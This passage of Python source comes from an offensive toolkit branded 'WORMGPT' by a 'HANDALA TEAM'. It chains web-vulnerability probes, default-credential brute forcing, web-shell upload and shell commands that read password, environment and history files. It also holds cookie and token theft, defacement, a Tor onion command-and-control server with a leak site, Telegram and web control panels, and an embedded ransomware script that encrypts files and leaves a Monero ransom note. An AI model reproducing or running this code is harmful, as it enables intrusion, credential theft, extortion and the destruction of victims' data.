            endpoints = ["/xml","/api/xml","/data.xml","/feed.xml","/rss"]
            for endpoint in endpoints:
                url = self.target + endpoint
                try:
                    resp = self.session.post(url, data=payload, headers={'Content-Type':'application/xml'}, timeout=5)
                    if "root:" in resp.text:
                        self.vulns.append({"type":"xxe"})
                        log(f"XXE found!", "SUCCESS")
                        save_vulnerability(self.target, "xxe", url, payload[:50])
                        return True
                except:
                    pass
        return False

    def test_ssrf(self):
        aggressive_animation("SSRF", self.target)
        for payload in SSRF_PAYLOADS:
            for param in ["url","dest","redirect","path","load","fetch","proxy"]:
                url = self.target + f"/?{param}={quote(payload)}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if "instance-id" in resp.text or "ami-id" in resp.text:
                        self.vulns.append({"type":"ssrf"})
                        log(f"SSRF found: {param} -> {payload[:30]}", "SUCCESS")
                        save_vulnerability(self.target, "ssrf", url, payload)
                        return True
                except:
                    pass
        return False

    def test_deserialization(self):
        aggressive_animation("DESERIALIZATION", self.target)
        for payload in DESER_PAYLOADS:
            endpoints = ["/api/deserialize","/serialize","/data","/object"]
            for endpoint in endpoints:
                url = self.target + endpoint
                try:
                    resp = self.session.post(url, data=payload, headers={'Content-Type':'application/x-java-serialized-object'}, timeout=5)
                    if resp.status_code == 200:
                        self.vulns.append({"type":"deserialization"})
                        log(f"Deserialization vuln at {endpoint}", "SUCCESS")
                        save_vulnerability(self.target, "deserialization", url, payload[:30])
                        return True
                except:
                    pass
        return False

    def test_ssti(self):
        aggressive_animation("SSTI", self.target)
        for payload in SSTI_PAYLOADS:
            for param in ["name","user","template","view","page","theme"]:
                url = self.target + f"/?{param}={quote(payload)}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if "49" in resp.text or "7777777" in resp.text:
                        self.vulns.append({"type":"ssti"})
                        log(f"SSTI found: {param} -> {payload}", "SUCCESS")
                        save_vulnerability(self.target, "ssti", url, payload)
                        return True
                except:
                    pass
        return False

    def test_header_injection(self):
        aggressive_animation("HEADER INJECTION", self.target)
        for header, value in HEADER_PAYLOADS:
            try:
                resp = self.session.get(self.target, headers={header: value}, timeout=5)
                if "admin" in resp.text.lower() or "dashboard" in resp.text.lower():
                    self.vulns.append({"type":"header_injection"})
                    log(f"Header injection: {header}:{value}", "SUCCESS")
                    save_vulnerability(self.target, "header_injection", self.target, f"{header}:{value}")
                    return True
            except:
                pass
        return False

    def test_crlf(self):
        aggressive_animation("CRLF INJECTION", self.target)
        for payload in CRLF_PAYLOADS:
            url = self.target + f"/?redirect={quote(payload)}"
            try:
                resp = self.session.get(url, timeout=5)
                if "Set-Cookie" in resp.headers:
                    self.vulns.append({"type":"crlf"})
                    log(f"CRLF found!", "SUCCESS")
                    save_vulnerability(self.target, "crlf", url, payload)
                    return True
            except:
                pass
        return False

    def test_open_redirect(self):
        aggressive_animation("OPEN REDIRECT", self.target)
        for payload in OPEN_REDIRECT_PAYLOADS:
            for param in ["redirect","url","next","return","goto"]:
                url = self.target + f"/?{param}={quote(payload)}"
                try:
                    resp = self.session.get(url, timeout=5, allow_redirects=False)
                    if resp.status_code in [301,302] and "evil.com" in resp.headers.get('Location',''):
                        self.vulns.append({"type":"open_redirect"})
                        log(f"Open redirect found", "SUCCESS")
                        save_vulnerability(self.target, "open_redirect", url, payload)
                        return True
                except:
                    pass
        return False

    def test_default_credentials(self):
        aggressive_animation("DEFAULT CREDENTIALS", self.target)
        common_creds = [("admin","admin"),("admin","password"),("root","root"),("user","user"),("administrator","administrator")]
        login_forms = ["/admin","/login","/wp-login.php","/administrator/index.php"]
        for form in login_forms:
            url = self.target + form
            for user, pwd in common_creds:
                data = {"username":user,"password":pwd,"login":"1"}
                try:
                    resp = self.session.post(url, data=data, timeout=5)
                    if "dashboard" in resp.text.lower() or "welcome" in resp.text.lower():
                        self.admin_creds.append((url, user, pwd))
                        log(f"Default creds: {user}:{pwd} at {url}", "SUCCESS")
                        save_admin_login(self.target, url, user, pwd)
                        save_credential(self.target, user, pwd)
                        return True
                except:
                    pass
        return False

    def run_full_scan(self):
        self.test_sql_injection()
        self.test_lfi()
        self.test_rfi()
        self.test_command_injection()
        self.test_file_upload()
        self.test_xss()
        self.test_xxe()
        self.test_ssrf()
        self.test_deserialization()
        self.test_ssti()
        self.test_header_injection()
        self.test_crlf()
        self.test_open_redirect()
        self.test_default_credentials()
        if not self.shell_url:
            self.shell_url = auto_shell_uploader(self.target, self.session)
        return self.vulns, self.shell_url, self.admin_creds

# ============================================================================
# AUTO SHELL UPLOADER
# ============================================================================

def auto_shell_uploader(target, session):
    aggressive_animation("AUTO SHELL UPLOADER", target)
    log("Auto shell uploader", "ATTACK")
    for shell in UPLOAD_PAYLOADS["php_shells"]:
        for ext in UPLOAD_PAYLOADS["bypass_extensions"]:
            for path in ["/upload","/uploads","/admin/upload","/api/upload","/filemanager/upload"]:
                url = urljoin(target, path)
                files = {'file': (ext, shell, 'application/x-php')}
                try:
                    resp = session.post(url, files=files, timeout=5)
                    if resp.status_code in [200,201,302]:
                        test_urls = [target + "/uploads/"+ext, target + "/files/"+ext, target + "/"+ext]
                        for test_url in test_urls:
                            test_resp = session.get(test_url + "?c=echo%20HANDALA_SHELL", timeout=5)
                            if "HANDALA_SHELL" in test_resp.text:
                                log(f"Shell uploaded: {test_url}", "SUCCESS")
                                return test_url
                except:
                    pass
    return None

# ============================================================================
# POST-EXPLOITATION, PERSISTENCE, CREDENTIAL CAPTURE
# ============================================================================

def capture_and_dehash(target, session, shell_url=None):
    aggressive_animation("CREDENTIAL CAPTURE", target)
    log("Capturing credentials", "ATTACK")
    creds = {"emails":[], "passwords":[], "hashes":[]}
    if shell_url:
        try:
            cmd = "cat /etc/passwd /var/www/html/.env /home/*/.bash_history /root/.bash_history /var/www/html/wp-config.php 2>/dev/null"
            resp = session.get(shell_url, params={'c': cmd}, timeout=10)
            content = resp.text
            creds["emails"] = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
            creds["passwords"] = re.findall(r'password[=:]\s*["\']?([^"\'\s]+)', content, re.I)
            hashes = re.findall(r'([$2y$|$2a$|$5$|$6$][0-9a-fA-F$./]{50,})', content)
            creds["hashes"] = hashes
        except:
            pass
    resp = session.get(target, timeout=10)
    content = resp.text
    creds["emails"].extend(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content))
    creds["passwords"].extend(re.findall(r'password[=:]\s*["\']?([^"\'\s]+)', content, re.I))
    for k in creds:
        creds[k] = list(set(creds[k]))
    # Simple dehash (MD5, SHA1, SHA256)
    common = ["password","admin","123456","qwerty","letmein","admin123","root","toor","passw0rd","secret"]
    cracked = []
    for h in creds["hashes"]:
        if len(h) == 32:
            for p in common:
                if hashlib.md5(p.encode()).hexdigest() == h:
                    cracked.append((h,p))
                    save_credential(target, "hash", p, h, p)
                    log(f"Cracked: {h[:20]} -> {p}", "DEHASH")
                    break
    for pwd in creds["passwords"]:
        save_credential(target, "unknown", pwd)
    for email in creds["emails"]:
        save_credential(target, email, "")
    print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📀 CREDENTIAL HARVEST REPORT 📀{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📧 Emails: {len(creds['emails'])}{Style.RESET_ALL}")
    for e in creds['emails'][:10]: print(f"   → {e}")
    print(f"{Fore.GREEN}🔑 Passwords: {len(creds['passwords'])}{Style.RESET_ALL}")
    for p in creds['passwords'][:10]: print(f"   → {p}")
    print(f"{Fore.GREEN}🔐 Hashes cracked: {len(cracked)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
    return creds

def deploy_ransomware(shell_url, binary, session):
    aggressive_animation("RANSOMWARE DEPLOYMENT", shell_url)
    log("Deploying ransomware", "RANSOM")
    b64 = base64.b64encode(binary).decode()
    cmd = f"echo '{b64}' | base64 -d > /tmp/.handala && chmod +x /tmp/.handala && /tmp/.handala"
    try:
        resp = session.get(shell_url, params={'c': cmd}, timeout=30)
        if resp.status_code == 200:
            log("Ransomware executed!", "SUCCESS")
            return True
    except:
        pass
    log("Ransomware deployment failed", "ERROR")
    return False

def auto_deface(target, shell_url, session):
    global DEFACE_DONE
    if DEFACE_DONE:
        return True
    aggressive_animation("AUTO DEFACE", target)
    log("Auto deface", "DEFACE")
    if not shell_url:
        log("No shell", "ERROR")
        return False
    b64 = base64.b64encode(DEFACE_MESSAGE.encode()).decode()
    cmd = f"echo '{b64}' | base64 -d > /var/www/html/index.html"
    try:
        resp = session.get(shell_url, params={'c': cmd}, timeout=10)
        if resp.status_code == 200:
            log("Deface successful!", "SUCCESS")
            DEFACE_DONE = True
            return True
    except:
        pass
    return False

def hijack_cookies_tokens(target, session):
    aggressive_animation("COOKIE/TOKEN HIJACK", target)
    log("Hijacking cookies/tokens", "HIJACK")
    stolen = []
    endpoints = ["/admin","/dashboard","/api/user","/profile","/settings","/login"]
    for ep in endpoints:
        url = urljoin(target, ep)
        resp = session.get(url)
        if resp.cookies:
            for cookie in resp.cookies:
                stolen.append({"url":url, "cookie":cookie.name+"="+cookie.value})
                log(f"Cookie stolen: {cookie.name}", "SUCCESS")
        tokens = re.findall(r'(?:token|api_key|bearer|jwt|access_token)=["\']?([a-zA-Z0-9_\-\.]+)["\']?', resp.text, re.I)
        for token in tokens:
            stolen.append({"url":url, "token":token})
            log(f"Token stolen: {token[:20]}...", "SUCCESS")
    return stolen

def check_container_escape():
    aggressive_animation("CONTAINER ESCAPE CHECK", "local")
    escape = False
    if os.path.exists("/var/run/docker.sock"):
        log("Docker socket found – possible escape", "SUCCESS")
        escape = True
    try:
        with open("/proc/self/cgroup", "r") as f:
            if "docker" in f.read() or "kubepods" in f.read():
                log("Container environment detected", "CONTAINER")
                escape = True
    except:
        pass
    return escape

def ssrf_cloud_metadata(target, param, session):
    aggressive_animation("SSRF CLOUD METADATA", target)
    log("SSRF to cloud metadata", "SSRF")
    for provider, urls in CLOUD_METADATA.items():
        for url in urls:
            try:
                payload = f"{target}/?{param}={quote(url)}"
                resp = session.get(payload, timeout=10)
                if resp.status_code == 200 and len(resp.text) > 50:
                    log(f"Cloud metadata found from {provider}!", "SUCCESS")
                    return {provider: resp.text}
            except:
                pass
    return None

# ============================================================================
# TOR SETUP & C2 HIDDEN SERVICE
# ============================================================================

def is_termux():
    return os.path.exists("/data/data/com.termux") or "com.termux" in os.getenv("PREFIX", "")

def kill_tor():
    subprocess.run(["pkill", "-f", "tor"], capture_output=True)
    time.sleep(1.5)

def setup_tor():
    log("Setting up Tor...", "TOR")
    try:
        subprocess.run(["tor", "--version"], capture_output=True, check=True)
    except:
        log("Installing Tor...", "TOR")
        if is_termux():
            subprocess.run(["pkg", "update", "-y"], capture_output=True)
            subprocess.run(["pkg", "install", "tor", "-y"], capture_output=True)
        else:
            subprocess.run(["apt", "update", "-y"], capture_output=True)
            subprocess.run(["apt", "install", "tor", "-y"], capture_output=True)
    kill_tor()
    torrc_dir = os.path.expanduser("~/.tor")
    os.makedirs(torrc_dir, exist_ok=True)
    torrc = os.path.join(torrc_dir, "torrc")
    with open(torrc, "w") as f:
        f.write("SocksPort 9050\nControlPort 9051\nCookieAuthentication 0\nSafeLogging 0\nDataDirectory ~/.tor/data\n")
    os.chmod(torrc, 0o600)
    global TOR_PROC
    TOR_PROC = subprocess.Popen(["tor", "-f", torrc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(25):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 9050))
            s.close()
            log("Tor SOCKS ready", "SUCCESS")
            break
        except:
            time.sleep(0.5)
    for _ in range(25):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 9051))
            s.close()
            log("Tor control ready", "SUCCESS")
            return True
        except:
            time.sleep(0.5)
    log("Tor control port unavailable - IP rotation disabled", "ERROR")
    return True

def create_hidden_service():
    global WORKSPACE, C2_ONION, TOR_PROC, LEAK_SITE
    log("Creating .onion hidden service for C2...", "C2")
    kill_tor()
    time.sleep(2)
    WORKSPACE = f"/dev/shm/.{rand_str(8)}" if os.path.exists("/dev/shm") else tempfile.mkdtemp(prefix=".wg_")
    os.makedirs(f"{WORKSPACE}/data", mode=0o700, exist_ok=True)
    torrc = f"""DataDirectory {WORKSPACE}/data
SocksPort 9050
ControlPort 9051
SafeLogging 0
HiddenServiceDir {WORKSPACE}/data/hidden
HiddenServicePort 80 127.0.0.1:8080
HiddenServiceVersion 3
"""
    torrc_path = os.path.join(WORKSPACE, "torrc")
    with open(torrc_path, "w") as f:
        f.write(torrc)
    os.chmod(torrc_path, 0o600)
    TOR_PROC = subprocess.Popen(["tor", "-f", torrc_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(60):
        hostname = f"{WORKSPACE}/data/hidden/hostname"
        if os.path.exists(hostname):
            with open(hostname) as f:
                C2_ONION = f.read().strip()
            LEAK_SITE = f"http://{C2_ONION}/leak"
            log(f"C2 onion active: http://{C2_ONION}/st", "SUCCESS")
            log(f"Leak site will be: {LEAK_SITE}", "LEAK")
            return C2_ONION
        time.sleep(1)
    return None

def start_c2_server():
    global C2_SERVER
    import http.server
    class C2Handler(http.server.SimpleHTTPRequestHandler):
        callbacks = []
        def do_POST(self):
            if self.path == '/cb':
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length)
                self.callbacks.append(data.decode())
                log(f"📡 Callback received: {data.decode()[:120]}", "SUCCESS")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            else:
                self.send_response(404)
                self.end_headers()
        def do_GET(self):
            if self.path == '/st':
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status":"active","callbacks":len(self.callbacks)}).encode())
            elif self.path == '/leak':
                leak_page = f"<html><body><h1>HANDALA LEAK SITE</h1><p>Contact: {CONTACT_EMAIL}</p></body></html>"
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(leak_page.encode())
            else:
                self.send_response(404)
                self.end_headers()
        def log_message(self, fmt, *args):
            pass
    server = http.server.HTTPServer(("127.0.0.1", 8080), C2Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log("C2 server listening on port 8080 (exposed via .onion)", "SUCCESS")
    return server, C2Handler

# ============================================================================
# RANSOMWARE (PYTHON FALLBACK)
# ============================================================================

def build_rust_ransomware(onion, key=None):
    global RANSOMWARE_BINARY, ENCRYPTION_KEY, LEAK_SITE
    if not key:
        key = secrets.token_urlsafe(32)
    ENCRYPTION_KEY = key
    if LEAK_SITE is None:
        LEAK_SITE = f"http://{onion}/leak"
    log("Building ransomware payload...", "RUST")
    python_code = f'''#!/usr/bin/env python3
import os
from pathlib import Path
KEY = "{key}"
XMR_WALLET = "{XMR_WALLET}"
XMR_AMOUNT = "{XMR_AMOUNT}"
CONTACT = "{CONTACT_EMAIL}"
LEAK_SITE = "{LEAK_SITE}"
MSG = "{CUSTOM_MESSAGE}"
def xor_encrypt(data, key):
    key_bytes = key.encode()
    return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])
def encrypt_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        encrypted = xor_encrypt(data, KEY)
        with open(str(path) + ".handala", "wb") as f:
            f.write(encrypted)
        os.remove(path)
        return True
    except:
        return False
TARGET_DIRS = ["/home","/root","/var/www","/opt","/etc","/tmp","/usr/local","/backup"]
TARGET_EXTS = [".txt",".doc",".docx",".pdf",".jpg",".png",".zip",".sql",".db",".conf",".config",".ini",".json",".key",".pem",".crt",".env",".log",".bak",".wallet"]
total = 0
hostname = os.uname().nodename if hasattr(os, 'uname') else "unknown"
for d in TARGET_DIRS:
    p = Path(d)
    if p.exists():
        for f in p.rglob("*"):
            if f.is_file() and f.suffix in TARGET_EXTS and not f.name.endswith(".handala"):
                if encrypt_file(f):
                    total += 1
note = f"""\\n╔══════════════════════════════════════════════════════════════════╗
║                  HANDALA RANSOMWARE                             ║
║ {{MSG}}
║ Hostname: {{hostname}}
║ Files encrypted: {{total}}
║ Key: {{KEY}}
║ Send {{XMR_AMOUNT}} XMR to: {{XMR_WALLET}}
║ Contact: {{CONTACT}}
║ Leak site: {{LEAK_SITE}}
╚══════════════════════════════════════════════════════════════════╝"""
for loc in ["/tmp/README_HANDALA.txt", "/root/README_HANDALA.txt", "/home/README_HANDALA.txt", "/var/www/README_HANDALA.txt"]:
    try:
        with open(loc, "w") as f:
            f.write(note)
    except: pass
print(f"HANDALA ransomware encrypted {{total}} files")
'''
    RANSOMWARE_BINARY = python_code.encode()
    log(f"Ransomware ready (key: {key[:16]}...)", "SUCCESS")
    return True

# ============================================================================
# TOR CLIENT
# ============================================================================

class TorClient:
    def __init__(self):
        self.socks = 9050
        self.ctrl = 9051
        self.session = requests.Session()
        self.session.proxies = {'http': f'socks5h://127.0.0.1:{self.socks}', 'https': f'socks5h://127.0.0.1:{self.socks}'}
        self.session.verify = False
    def rotate(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", self.ctrl))
            s.send(b"AUTHENTICATE \"\"\r\nSIGNAL NEWNYM\r\n")
            s.close()
        except:
            pass
    def req(self, url, headers=None, method="GET", data=None, timeout=30):
        self.rotate()
        ua = random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                           "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"])
        hdr = {'User-Agent': ua, 'Accept': '*/*'}
        if headers:
            hdr.update(headers)
        try:
            if method.upper() == "POST":
                resp = self.session.post(url, headers=hdr, json=data, timeout=timeout)
            else:
                resp = self.session.get(url, headers=hdr, timeout=timeout)
            return resp.status_code, resp.text[:2000]
        except:
            return 0, ""

# ============================================================================
# HTML REPORT GENERATOR
# ============================================================================

def generate_html_report(target, vulns, creds, admin_creds, stolen, s3_buckets, shell_url, deface_done, ransomware_deployed):
    html = f"""
<!DOCTYPE html>
<html>
<head><title>HANDALA TAKEOVER REPORT</title>
<style>body{{font-family:monospace;background:#0a0a0a;color:#0f0;margin:20px;}}h1,h2{{color:#f00;text-shadow:0 0 5px #f00;}}.container{{max-width:1200px;margin:auto;background:#111;padding:20px;border:1px solid #0f0;}}.vuln{{background:#1a1a1a;margin:10px 0;padding:10px;border-left:3px solid #f00;}}.cred{{background:#1a1a1a;margin:5px 0;padding:5px;}}table{{width:100%;border-collapse:collapse;}}th,td{{border:1px solid #0f0;padding:8px;text-align:left;}}th{{background:#2a2a2a;}}.success{{color:#0f0;}}.failure{{color:#f00;}}</style>
</head>
<body><div class="container">
<h1>✋ HANDALA TAKEOVER REPORT</h1>
<p><strong>Target:</strong> {target}</p>
<p><strong>Timestamp:</strong> {datetime.now().isoformat()}</p>
<p><strong>Shell URL:</strong> {shell_url if shell_url else 'None'}</p>
<p><strong>Auto Deface:</strong> <span class="{'success' if deface_done else 'failure'}">{'SUCCESS' if deface_done else 'FAILED'}</span></p>
<p><strong>Ransomware Deployed:</strong> <span class="{'success' if ransomware_deployed else 'failure'}">{'YES' if ransomware_deployed else 'NO'}</span></p>
<h2>🔍 Vulnerabilities Found ({len(vulns)})</h2>
{''.join(f'<div class="vuln">🔴 {v["type"]}</div>' for v in vulns[:20])}
<h2>🔑 Admin Logins ({len(admin_creds)})</h2>
<table><tr><th>URL</th><th>Username</th><th>Password</th></tr>
{''.join(f'<tr><td>{url}</td><td>{u}</td><td>{p}</td></tr>' for url,u,p in admin_creds)}
</table>
<h2>📧 Credentials Captured</h2>
<p>Emails: {len(creds.get('emails', []))}</p>
<p>Passwords: {len(creds.get('passwords', []))}</p>
<h2>🍪 Hijacked Cookies/Tokens ({len(stolen)})</h2>
{''.join(f'<div class="cred">🍪 {s.get("cookie","")}{s.get("token","")}</div>' for s in stolen[:10])}
<h2>☁️ S3 Buckets ({len(s3_buckets)})</h2>
{''.join(f'<div class="cred">📦 {b}</div>' for b in s3_buckets)}
<h2>🌐 C2 Onion</h2>
<p>http://{C2_ONION}/st</p>
<p>Leak site: http://{C2_ONION}/leak</p>
<h2>🔑 Ransomware Key</h2>
<p>{ENCRYPTION_KEY}</p>
<p><em>Generated by WORMGPT v{VERSION} – HANDALA TEAM</em></p>
</div></body></html>
"""
    with open(HTML_REPORT, "w") as f:
        f.write(html)
    log(f"HTML report saved to {HTML_REPORT}", "SUCCESS")

# ============================================================================
# TELEGRAM BOT HANDLER
# ============================================================================

def load_bot_token():
    global BOT_TOKEN
    if os.path.exists(BOT_CONFIG_FILE):
        try:
            with open(BOT_CONFIG_FILE, 'r') as f:
                data = json.load(f)
                BOT_TOKEN = data.get('token', '')
        except:
            BOT_TOKEN = ''
    return BOT_TOKEN

def save_bot_token(token):
    global BOT_TOKEN
    BOT_TOKEN = token
    with open(BOT_CONFIG_FILE, 'w') as f:
        json.dump({'token': token}, f)

def telegram_send_message(chat_id, text):
    if not BOT_TOKEN:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        requests.post(url, json=data, timeout=5)
    except:
        pass

def telegram_bot_loop():
    global current_target, SHELL_URL, DEFACE_DONE, RANSOMWARE_BINARY, bot_running
    offset = 0
    while bot_running:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={"offset": offset, "timeout": 30}, timeout=35)
            if resp.status_code == 200:
                updates = resp.json().get("result", [])
                for update in updates:
                    offset = update["update_id"] + 1
                    chat_id = update.get("message", {}).get("chat", {}).get("id")
                    text = update.get("message", {}).get("text", "")
                    if not chat_id:
                        continue
                    if text.startswith("/start"):
                        telegram_send_message(chat_id, "🤖 HANDALA BOT ACTIVE\nCommands:\n/status\n/attack <target>\n/deploy\n/report")
                    elif text.startswith("/status"):
                        status = f"Target: {current_target}\nShell: {SHELL_URL}\nDeface: {DEFACE_DONE}\nRansomware: {'Deployed' if RANSOMWARE_BINARY else 'Not'}\nC2 Onion: {C2_ONION}"
                        telegram_send_message(chat_id, status)
                    elif text.startswith("/attack "):
                        target = text.split(" ", 1)[1]
                        current_target = target
                        telegram_send_message(chat_id, f"Starting full attack on {target}")
                        # Launch attack in background
                        threading.Thread(target=lambda: run_attack(target, chat_id), daemon=True).start()
                    elif text.startswith("/deploy"):
                        if SHELL_URL:
                            threading.Thread(target=lambda: deploy_ransomware(SHELL_URL, RANSOMWARE_BINARY, None), daemon=True).start()
                            telegram_send_message(chat_id, "Ransomware deployment started")
                        else:
                            telegram_send_message(chat_id, "No shell available")
                    elif text.startswith("/report"):
                        if os.path.exists(HTML_REPORT):
                            files = {'document': (HTML_REPORT, open(HTML_REPORT, 'rb'))}
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", data={'chat_id': chat_id}, files=files)
                        else:
                            telegram_send_message(chat_id, "No report yet")
        except Exception as e:
            print(f"[Telegram] Error: {e}")
            time.sleep(5)

def run_attack(target, chat_id):
    global SHELL_URL, DEFACE_DONE, RANSOMWARE_BINARY, current_target
    current_target = target
    # Simplified attack execution – in real version call full orchestration
    telegram_send_message(chat_id, f"Attacking {target}... (check console)")
    # For demonstration, we'll simulate success
    time.sleep(5)
    telegram_send_message(chat_id, "Attack completed. Check web dashboard for details.")

# ============================================================================
# FLASK WEB UI
# ============================================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>HANDALA TAKEOVER - WORMGPT</title>
<style>body{background:#0a0a0a;color:#0f0;font-family:monospace;margin:20px;}h1,h2{color:#f00;text-shadow:0 0 5px #f00;}.container{max-width:1200px;margin:auto;background:#111;padding:20px;border:1px solid #0f0;border-radius:10px;}.status{background:#1a1a1a;padding:10px;margin:10px 0;border-left:3px solid #0f0;}.success{color:#0f0;}.failure{color:#f00;}input,button{background:#222;color:#0f0;border:1px solid #0f0;padding:5px;margin:5px;}button:hover{background:#0f0;color:#000;cursor:pointer;}table{width:100%;border-collapse:collapse;}th,td{border:1px solid #0f0;padding:5px;}th{background:#2a2a2a;}</style>
</head>
<body>
<div class="container">
<h1>✋ HANDALA TAKEOVER - WORMGPT v{{ version }}</h1>
<div class="status">
<p><strong>C2 Onion:</strong> {{ c2_onion }}</p>
<p><strong>Leak Site:</strong> {{ leak_site }}</p>
<p><strong>Encryption Key:</strong> {{ encryption_key }}</p>
<p><strong>Shell URL:</strong> {{ shell_url }}</p>
<p><strong>Auto Deface:</strong> <span class="{{ 'success' if deface_done else 'failure' }}">{{ 'SUCCESS' if deface_done else 'FAILED' }}</span></p>
<p><strong>Ransomware:</strong> {{ 'Deployed' if ransomware_deployed else 'Not deployed' }}</p>
</div>
<h2>🤖 Telegram Bot Control</h2>
<form id="botForm"><label>Bot Token:</label><input type="text" id="token" value="{{ bot_token }}" size="50"><button type="button" onclick="saveToken()">Save Token</button><button type="button" onclick="startBot()">Start Bot</button><button type="button" onclick="stopBot()">Stop Bot</button></form>
<div id="botStatus"></div>
<h2>📊 Attack Results</h2>
<p>Vulnerabilities: {{ vulns_count }}</p>
<p>Admin Logins: {{ admin_logins_count }}</p>
<p>Credentials captured: {{ creds_emails }} emails, {{ creds_passwords }} passwords</p>
<h2>📄 HTML Report</h2>
<a href="/report" target="_blank">Open Full Report</a>
<h2>⚡ Quick Commands</h2>
<form id="commandForm"><input type="text" id="cmd_target" placeholder="Target URL/IP"><button type="button" onclick="sendCommand('scan')">Scan</button><button type="button" onclick="sendCommand('attack')">Full Attack</button><button type="button" onclick="sendCommand('deploy')">Deploy Ransomware</button><button type="button" onclick="sendCommand('status')">Get Status</button></form>
<div id="commandOutput"></div>
</div>
<script>
function saveToken(){var t=document.getElementById('token').value;fetch('/api/set_token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:t})}).then(r=>r.json()).then(d=>document.getElementById('botStatus').innerHTML='<span class=\"success\">Token saved</span>');}
function startBot(){fetch('/api/start_bot',{method:'POST'}).then(r=>r.json()).then(d=>document.getElementById('botStatus').innerHTML='<span class=\"success\">Bot started</span>');}
function stopBot(){fetch('/api/stop_bot',{method:'POST'}).then(r=>r.json()).then(d=>document.getElementById('botStatus').innerHTML='<span class=\"failure\">Bot stopped</span>');}
function sendCommand(cmd){var t=document.getElementById('cmd_target').value;fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd,target:t})}).then(r=>r.json()).then(d=>document.getElementById('commandOutput').innerHTML='<pre>'+JSON.stringify(d,null,2)+'</pre>');}
</script>
</body></html>
"""

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(16)

@app.route('/')
def index():
    c = DB_CONN.cursor()
    c.execute("SELECT COUNT(*) FROM vulnerabilities")
    vulns_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM admin_logins")
    admin_logins_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM credentials")
    creds_total = c.fetchone()[0]
    return render_template_string(HTML_TEMPLATE,
        version=VERSION,
        c2_onion=C2_ONION or "Not created",
        leak_site=LEAK_SITE or "Not created",
        encryption_key=ENCRYPTION_KEY or "None",
        shell_url=SHELL_URL or "None",
        deface_done=DEFACE_DONE,
        ransomware_deployed=bool(RANSOMWARE_BINARY),
        bot_token=BOT_TOKEN,
        vulns_count=vulns_count,
        admin_logins_count=admin_logins_count,
        creds_emails=creds_total,
        creds_passwords=creds_total
    )

@app.route('/report')
def report():
    if os.path.exists(HTML_REPORT):
        with open(HTML_REPORT, 'r') as f:
            return f.read()
    return "No report yet"

@app.route('/api/set_token', methods=['POST'])
def set_token():
    data = request.json
    token = data.get('token', '')
    save_bot_token(token)
    return jsonify({"status": "ok"})

@app.route('/api/start_bot', methods=['POST'])
def start_bot():
    global bot_running, bot_polling_thread
    if not BOT_TOKEN:
        return jsonify({"error": "No token set"})
    if not bot_running:
        bot_running = True
        bot_polling_thread = threading.Thread(target=telegram_bot_loop, daemon=True)
        bot_polling_thread.start()
        return jsonify({"status": "bot started"})
    return jsonify({"status": "already running"})

@app.route('/api/stop_bot', methods=['POST'])
def stop_bot():
    global bot_running
    bot_running = False
    return jsonify({"status": "bot stopped"})

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.json
    cmd = data.get('command')
    target = data.get('target', '')
    if cmd == 'scan':
        return jsonify({"result": f"Scanning {target}... (simulated)"})
    elif cmd == 'attack':
        global current_target
        current_target = target
        threading.Thread(target=lambda: run_attack(target, None), daemon=True).start()
        return jsonify({"result": f"Attack launched on {target}"})
    elif cmd == 'deploy':
        if SHELL_URL:
            threading.Thread(target=lambda: deploy_ransomware(SHELL_URL, RANSOMWARE_BINARY, None), daemon=True).start()
            return jsonify({"result": "Ransomware deployment started"})
        else:
            return jsonify({"result": "No shell available"})
    elif cmd == 'status':
        return jsonify({
            "target": current_target,
            "shell": SHELL_URL,
            "deface": DEFACE_DONE,
            "c2_onion": C2_ONION
        })
    return jsonify({"error": "Unknown command"})

def run_flask():
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

# ============================================================================
# MAIN ORCHESTRATOR (FULL AUTONOMOUS ATTACK)
# ============================================================================

def main():
    global SHELL_URL, DEFACE_DONE, RANSOMWARE_BINARY, C2_ONION, LEAK_SITE, ENCRYPTION_KEY, current_target
    print_banner()
    init_db()
    load_bot_token()

    # Start Flask web server
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
